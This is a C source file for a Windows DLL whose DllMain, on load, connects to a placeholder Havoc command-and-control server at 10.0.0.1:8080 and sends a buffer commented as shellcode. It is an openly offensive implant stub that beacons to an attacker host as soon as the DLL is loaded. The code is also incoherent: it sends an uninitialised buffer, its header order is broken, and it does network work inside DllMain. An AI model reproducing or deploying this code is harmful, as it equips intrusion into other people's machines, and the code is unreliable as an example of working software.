#include <windows.h>
#include <stdio.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_SERVER "10.0.0.1"  // Replace with your Havoc C2 server IP
#define C2_PORT 8080           // Replace with your Havoc C2 server port

void ConnectToC2() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[1024];

    // Initialize Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed!\n");
        return;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(C2_SERVER);
    server.sin_port = htons(C2_PORT);

    // Connect to C2 server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed!\n");
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Send shellcode (replace with actual shellcode)
    send(sock, buffer, sizeof(buffer), 0);
    closesocket(sock);
    WSACleanup();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        ConnectToC2();  // Connect to the C2 server when the DLL is loaded
    }
    return TRUE;
}
